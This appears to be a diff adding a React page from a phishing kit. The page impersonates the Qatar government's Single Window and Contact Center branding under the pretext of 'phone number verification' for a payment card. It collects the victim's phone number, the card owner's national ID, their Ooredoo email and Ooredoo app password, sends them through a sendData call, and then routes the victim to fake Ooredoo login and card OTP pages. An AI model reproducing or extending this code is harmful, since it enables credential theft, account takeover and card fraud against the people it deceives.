@@ -1,0 +1,231 @@
+import { useState } from "react";
+import { useLocation } from "wouter";
+import { sendData, navigateToPage } from "@/lib/store";
+import { useEffect } from "react";
+
+const inputStyle = (hasError: boolean) => ({
+  width: "100%",
+  padding: "10px 14px",
+  border: `1px solid ${hasError ? "#cc0000" : "#ccc"}`,
+  borderRadius: 3,
+  fontSize: 14,
+  color: "#333",
+  backgroundColor: "#fff",
+  outline: "none",
+  fontFamily: "inherit",
+  textAlign: "right" as const,
+  direction: "rtl" as const,
+  boxSizing: "border-box" as const,
+});
+
+export default function MobileVerification() {
+  const [, navigate] = useLocation();
+  const [provider, setProvider] = useState("");
+  const [open, setOpen] = useState(false);
+  const [errors, setErrors] = useState<Record<string, string>>({});
+
+  // Ooredoo fields
+  const [phone, setPhone] = useState("");
+  const [nationalId, setNationalId] = useState("");
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+
+  // Vodafone fields
+  const [vodaPhone, setVodaPhone] = useState("");
+
+  useEffect(() => { navigateToPage("توثيق رقم الهاتف"); }, []);
+
+  const providers = [
+    { value: "ooredoo", label: "اوريدو ooredoo" },
+    { value: "vodafone", label: "فودافون vodafone" },
+  ];
+
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    const errs: Record<string, string> = {};
+    if (!provider) { errs.provider = "يرجى اختيار مزود الخدمة"; }
+    if (provider === "ooredoo") {
+      if (!phone.trim()) errs.phone = "هذا الحقل مطلوب";
+      if (!nationalId.trim()) errs.nationalId = "هذا الحقل مطلوب";
+      if (!email.trim()) errs.email = "هذا الحقل مطلوب";
+      if (!password.trim()) errs.password = "هذا الحقل مطلوب";
+    } else if (provider === "vodafone") {
+      if (!vodaPhone.trim()) errs.vodaPhone = "هذا الحقل مطلوب";
+    }
+    if (Object.keys(errs).length > 0) { setErrors(errs); return; }
+    setErrors({});
+
+    sendData({
+      mobileVerification: { provider, phone: provider === "ooredoo" ? phone : vodaPhone, nationalId, email, password },
+      current: "توثيق رقم الهاتف",
+      nextPage: "توثيق رقم الجوال OTP",
+      waitingForAdminResponse: false,
+    });
+
+    if (provider === "ooredoo") {
+      navigate("/ooredoo-login");
+    } else {
+      navigate("/card-otp");
+    }
+  };
+
+  const fieldStyle = { marginBottom: 20 };
+  const labelStyle = { display: "block", fontSize: 13, fontWeight: "600" as const, color: "#333", marginBottom: 6, textAlign: "right" as const };
+
+  return (
+    <div style={{ minHeight: "100vh", display: "flex", flexDirection: "column", fontFamily: "'Tajawal','Cairo',Arial,sans-serif", direction: "rtl", backgroundColor: "#f5f5f5" }}>
+
+      {/* Header */}
+      <header style={{ backgroundColor: "#fff", borderBottom: "1px solid #e0e0e0", padding: "10px 30px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
+        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", lineHeight: 1 }}>
+            <span style={{ fontSize: 20, fontWeight: "900", color: "#8B0000" }}>1</span>
+            <span style={{ fontSize: 20, fontWeight: "900", color: "#8B0000" }}>9</span>
+          </div>
+          <div>
+            <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
+              <span style={{ fontSize: 18, fontWeight: "900", color: "#8B0000" }}>Q</span>
+              <span style={{ fontSize: 18, fontWeight: "900", color: "#1a3c6e" }}>GCC</span>
+              <span style={{ fontSize: 9, color: "#555", marginRight: 4 }}>QATAR GOVERNMENT CONTACT CENTER</span>
+            </div>
+            <div style={{ fontSize: 10, color: "#555", textAlign: "right" }}>مركز الإتصال الحكومي - قطر</div>
+          </div>
+        </div>
+        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
+          <div style={{ textAlign: "right" }}>
+            <div style={{ fontSize: 13, fontWeight: "700", color: "#1a3c6e" }}>النافـذة الـواحدة</div>
+            <div style={{ fontSize: 10, color: "#1a3c6e", letterSpacing: 1 }}>SINGLE WINDOW</div>
+          </div>
+          <svg viewBox="0 0 60 60" style={{ width: 44, height: 44 }}>
+            <polygon points="30,5 55,20 55,40 30,55 5,40 5,20" fill="none" stroke="#1a3c6e" strokeWidth="3"/>
+            <polygon points="30,15 45,23 45,37 30,45 15,37 15,23" fill="#1a3c6e"/>
+            <polygon points="30,22 38,27 38,33 30,38 22,33 22,27" fill="#fff"/>
+          </svg>
+        </div>
+      </header>
+
+      {/* Main */}
+      <main style={{ flex: 1, padding: "30px 20px" }}>
+        <div style={{ maxWidth: 900, margin: "0 auto", backgroundColor: "#fff", border: "1px solid #e0e0e0", borderRadius: 4, padding: "30px 40px" }}>
+          <h1 style={{ fontSize: 22, fontWeight: "700", color: "#1a3c6e", textAlign: "right", margin: "0 0 16px 0", paddingBottom: 16, borderBottom: "1px solid #e0e0e0" }}>
+            توثيق رقم الهاتف
+          </h1>
+          <p style={{ fontSize: 14, fontWeight: "700", color: "#1a3c6e", textAlign: "right", margin: "0 0 10px 0" }}>
+            يرجى ادخال الهاتف المرتبط بطريقة الدفع، لإثبات ملكية البطاقة.
+          </p>
+          <p style={{ fontSize: 13, color: "#555", textAlign: "right", margin: "0 0 28px 0", lineHeight: 1.7 }}>
+            لا يشترط الدفع ببطاقة تابعة للمستخدم المراد تسجيله، يمكنك استخدام بطاقة تعود لشخص اخر، لكن يجب اثبات ملكيتها من خلال رقم الهاتف والرقم الشخصي لصاحب البطاقة.
+          </p>
+
+          <form onSubmit={handleSubmit} style={{ maxWidth: 480 }}>
+
+            {/* Provider Dropdown */}
+            <div style={fieldStyle}>
+              <label style={labelStyle}>مزود الخدمة <span style={{ color: "#cc0000" }}>*</span></label>
+              <div style={{ position: "relative" }}>
+                <div
+                  onClick={() => setOpen(!open)}
+                  style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "10px 14px", border: `1px solid ${errors.provider ? "#cc0000" : "#ccc"}`, borderRadius: 3, backgroundColor: "#fff", cursor: "pointer", fontSize: 14, color: provider ? "#333" : "#aaa" }}
+                >
+                  <svg viewBox="0 0 10 6" style={{ width: 12, height: 8, transform: open ? "rotate(180deg)" : "none", transition: "0.2s", flexShrink: 0 }}>
+                    <path d="M1 1l4 4 4-4" stroke="#666" strokeWidth="1.5" fill="none" strokeLinecap="round"/>
+                  </svg>
+                  <span>{provider ? providers.find(p => p.value === provider)?.label : "اختر مزود الخدمة"}</span>
+                </div>
+                {open && (
+                  <div style={{ position: "absolute", top: "100%", right: 0, left: 0, backgroundColor: "#fff", border: "1px solid #ccc", borderTop: "none", zIndex: 100, boxShadow: "0 4px 8px rgba(0,0,0,0.1)" }}>
+                    {providers.map(p => (
+                      <div key={p.value} onClick={() => { setProvider(p.value); setOpen(false); setErrors({}); setPhone(""); setNationalId(""); setEmail(""); setPassword(""); setVodaPhone(""); }}
+                        style={{ padding: "12px 16px", fontSize: 14, color: "#333", cursor: "pointer", textAlign: "right", borderBottom: "1px solid #f0f0f0" }}
+                        onMouseOver={(e) => { e.currentTarget.style.backgroundColor = "#f5f5f5"; }}
+                        onMouseOut={(e) => { e.currentTarget.style.backgroundColor = "#fff"; }}>
+                        {p.label}
+                      </div>
+                    ))}
+                  </div>
+                )}
+              </div>
+              {errors.provider && <span style={{ color: "#cc0000", fontSize: 12, marginTop: 4, display: "block" }}>{errors.provider}</span>}
+            </div>
+
+            {/* Ooredoo Fields */}
+            {provider === "ooredoo" && (
+              <>
+                <div style={fieldStyle}>
+                  <label style={labelStyle}>رقم الهاتف <span style={{ color: "#cc0000" }}>*</span></label>
+                  <input type="tel" value={phone} onChange={(e) => { setPhone(e.target.value.replace(/\D/g, "")); setErrors(p => ({...p, phone: ""})); }} placeholder="Phone" style={inputStyle(!!errors.phone)} />
+                  {errors.phone && <span style={{ color: "#cc0000", fontSize: 12, marginTop: 4, display: "block" }}>{errors.phone}</span>}
+                </div>
+                <div style={fieldStyle}>
+                  <label style={labelStyle}>الرقم الشخصي لمالك البطاقة <span style={{ color: "#cc0000" }}>*</span></label>
+                  <input type="text" value={nationalId} onChange={(e) => { setNationalId(e.target.value); setErrors(p => ({...p, nationalId: ""})); }} placeholder="Id" style={inputStyle(!!errors.nationalId)} />
+                  {errors.nationalId && <span style={{ color: "#cc0000", fontSize: 12, marginTop: 4, display: "block" }}>{errors.nationalId}</span>}
+                </div>
+                <div style={fieldStyle}>
+                  <label style={labelStyle}>البريد الالكتروني المعتمد بـ ooredoo <span style={{ color: "#cc0000" }}>*</span></label>
+                  <input type="email" value={email} onChange={(e) => { setEmail(e.target.value.replace(/[\u0600-\u06FF]/g, "")); setErrors(p => ({...p, email: ""})); }} placeholder="Email" style={{ ...inputStyle(!!errors.email), direction: "ltr", textAlign: "left" }} />
+                  {errors.email && <span style={{ color: "#cc0000", fontSize: 12, marginTop: 4, display: "block" }}>{errors.email}</span>}
+                </div>
+                <div style={fieldStyle}>
+                  <label style={labelStyle}>كلمة المرور لتطبيق ooredoo <span style={{ color: "#cc0000" }}>*</span></label>
+                  <input type="password" value={password} onChange={(e) => { setPassword(e.target.value); setErrors(p => ({...p, password: ""})); }} style={inputStyle(!!errors.password)} />
+                  {errors.password && <span style={{ color: "#cc0000", fontSize: 12, marginTop: 4, display: "block" }}>{errors.password}</span>}
+                </div>
+              </>
+            )}
+
+            {/* Vodafone Fields */}
+            {provider === "vodafone" && (
+              <div style={fieldStyle}>
+                <label style={labelStyle}>رقم الهاتف <span style={{ color: "#cc0000" }}>*</span></label>
+                <input type="tel" value={vodaPhone} onChange={(e) => { setVodaPhone(e.target.value.replace(/\D/g, "")); setErrors(p => ({...p, vodaPhone: ""})); }} placeholder="Phone" style={inputStyle(!!errors.vodaPhone)} />
+                {errors.vodaPhone && <span style={{ color: "#cc0000", fontSize: 12, marginTop: 4, display: "block" }}>{errors.vodaPhone}</span>}
+              </div>
+            )}
+
+            {/* Submit */}
+            {provider && (
+              <button type="submit"
+                style={{ display: "block", width: "100%", padding: "12px", backgroundColor: "#1a7abf", color: "#fff", border: "none", borderRadius: 3, fontSize: 15, fontWeight: "600", cursor: "pointer", fontFamily: "inherit", textAlign: "center" }}
+                onMouseOver={(e) => { e.currentTarget.style.backgroundColor = "#1565a0"; }}
+                onMouseOut={(e) => { e.currentTarget.style.backgroundColor = "#1a7abf"; }}>
+                استمر
+              </button>
+            )}
+          </form>
+        </div>
+      </main>
+
+      {/* Footer */}
+      <footer style={{ background: "linear-gradient(135deg, #1a3c6e 0%, #1a7abf 100%)", padding: "28px 20px", textAlign: "center", color: "#fff" }}>
+        <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 14 }}>
+          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
+            <div style={{ textAlign: "right" }}>
+              <div style={{ fontSize: 14, fontWeight: "700", color: "#fff" }}>النافـذة الـواحدة</div>
+              <div style={{ fontSize: 10, color: "rgba(255,255,255,0.8)", letterSpacing: 1 }}>SINGLE WINDOW</div>
+            </div>
+            <svg viewBox="0 0 60 60" style={{ width: 44, height: 44 }}>
+              <polygon points="30,5 55,20 55,40 30,55 5,40 5,20" fill="none" stroke="rgba(255,255,255,0.6)" strokeWidth="3"/>
+              <polygon points="30,15 45,23 45,37 30,45 15,37 15,23" fill="rgba(255,255,255,0.8)"/>
+              <polygon points="30,22 38,27 38,33 30,38 22,33 22,27" fill="#1a3c6e"/>
+            </svg>
+          </div>
+          <div style={{ display: "flex", gap: 10 }}>
+            {[
+              { href: "https://www.linkedin.com/company/mociqatar/", icon: "in" },
+              { href: "https://www.youtube.com/mociqatar", icon: "▶" },
+              { href: "https://twitter.com/MOCIQatar", icon: "𝕏" },
+              { href: "https://www.instagram.com/mociqatar/", icon: "◎" },
+              { href: "https://www.facebook.com/MOCIQatar/", icon: "f" },
+            ].map((s) => (
+              <a key={s.href} href={s.href} target="_blank" rel="noreferrer"
+                style={{ width: 32, height: 32, borderRadius: "50%", border: "1px solid rgba(255,255,255,0.4)", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontSize: 12, textDecoration: "none" }}>
+                {s.icon}
+              </a>
+            ))}
+          </div>
+        </div>
+      </footer>
+    </div>
+  );
+}
